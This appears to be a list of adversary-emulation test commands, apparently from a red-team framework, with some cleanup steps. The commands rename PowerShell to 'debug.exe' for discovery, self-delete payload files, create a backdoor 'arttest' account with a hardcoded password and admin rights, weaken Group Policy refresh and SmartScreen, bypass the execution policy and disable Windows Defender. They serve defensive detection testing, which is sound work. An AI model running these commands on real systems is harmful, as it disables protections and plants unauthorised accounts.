scripts.command:
Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;
C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;
C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;
C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;
C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;

path="$(pwd)/#{stockpile_evasion_1070_004_exe_name}";
num_processes=$(for id in $(pgrep -f #{stockpile_evasion_1070_004_exe_name}); do lsof -p $id 2> /dev/null | grep "$path"; done | wc -l);
if [ "$num_processes" -le 1 ]; then /bin/rm -f "$path"; fi;

$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;
$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;
$processClass = Get-CimClass -ClassName Win32_Process;
Invoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{
    Commandline = 'cmd.exe /c "timeout /nobreak /t 10 >nul 2>nul & del /f #{stockpile_evasion_1070_004_location}"';
    ProcessStartupInformation = [CimInstance]$startupInfo
};

path="$(pwd)/#{stockpile_evasion_1070_004_exe_name}";
num_processes=$(for id in $(pgrep -f #{stockpile_evasion_1070_004_exe_name}); do lsof -p $id 2> /dev/null | grep "$path"; done | wc -l);
if [ "$num_processes" -le 1 ]; then /bin/rm -f "$path"; fi;

password=$(openssl passwd -1 "4RTisCool!321");
([ "$(uname)" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password arttest) || (pw useradd arttest -g wheel -s /bin/sh && (echo $password | pw mod user arttest -h 0));
su arttest -c "whoami; exit"

dscl . -create /Users/arttest;
dscl . -create /Users/arttest UserShell /bin/bash;
dscl . -create /Users/arttest RealName "Art Test";
dscl . -create /Users/arttest UniqueID 503;
dscl . -create /Users/arttest PrimaryGroupID 503;
dscl . -create /Users/arttest NFSHomeDirectory /Local/Users/arttest;
dscl . -passwd /Users/arttest 4RTisCool!321;
dscl . -append /Groups/admin GroupMembership arttest;

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f;
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f;
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f;
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f;
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f;
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ShellSmartScreenLevel /t REG_SZ /d Block /f;

scripts.cleanup_command:
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeDC /f;
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeOffsetDC /f;
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTime /f;
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeOffset /f;
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /f;
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ShellSmartScreenLevel /f;

scripts.command:
Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell -Name ExecutionPolicy -Value ByPass;
$shell = New-Object -ComObject Wscript.Shell
Set-ExecutionPolicy Bypass | echo $shell.sendkeys("Y`r`n")

Set-MpPreference -DisableIntrusionPreventionSystem $true;
Set-MpPreference -DisableIOAVProtection $true;
Set-MpPreference -DisableRealtimeMonitoring $true;
Set-MpPreference -DisableScriptScanning $true;
Set-MpPreference -EnableControlledFolderAccess Disabled;

scripts.cleanup_command:
Set-MpPreference -DisableIntrusionPreventionSystem $false;
Set-MpPreference -DisableIOAVProtection $false;
Set-MpPreference -DisableRealtimeMonitoring $false;
Set-MpPreference -DisableScriptScanning $false;
Set-MpPreference -EnableControlledFolderAccess Enabled;

scripts.command:
if (Get-Command "Set-MPPreference" -ErrorAction SilentlyContinue) {
  Set-MPPreference -DisableRealtimeMonitoring 1;
} else {
  $service = Get-Service WinDefend -ErrorAction SilentlyContinue;
  if ($service) {
    if ($service.Status -eq "Running") {
      Stop-Service WinDefend;
    }
  } else {
    echo "Windows Defender service not found.";
    exit 1;
  };
};
